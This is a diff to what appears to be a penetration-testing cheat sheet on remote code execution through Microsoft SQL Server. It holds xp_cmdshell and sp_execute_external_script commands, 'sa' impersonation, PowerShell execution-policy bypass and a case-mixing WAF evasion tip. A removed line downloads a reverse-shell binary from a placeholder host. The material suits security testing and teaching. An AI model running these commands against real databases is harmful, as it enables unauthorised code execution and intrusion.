@@ -391,7 +391,7 @@ enable_xp_cmdshell;
 #### 4. RCE
 
 ```console
-xp_cmdshell whoami
+xp_cmdshell powershell.exe -ep bypass <CMD>
 ```
 
 ---
@@ -431,7 +431,7 @@ execute as login = 'sa'; reconfigure;
 #### 4. RCE
 
 ```console
-execute as login = 'sa'; EXEC master..xp_cmdshell 'powershell.exe -ep bypass curl <LOCAL_IP>/rev.exe -o C:\ProgramData\rev.exe'
+execute as login = 'sa'; EXEC master..xp_cmdshell 'powershell.exe -ep bypass <CMD>'
 ```
 
 <small>*Note: try xp_cmDshElL to bypass WAF*</small>
@@ -443,5 +443,5 @@ execute as login = 'sa'; EXEC master..xp_cmdshell 'powershell.exe -ep bypass cur
 #### 1. Run External Script (Python)
 
 ```console
-EXEC sp_execute_external_script @language =N'Python', @script = N'import os; os.system("whoami");';
+EXEC sp_execute_external_script @language =N'Python', @script = N'import os; os.system("<CMD>");';
 ```
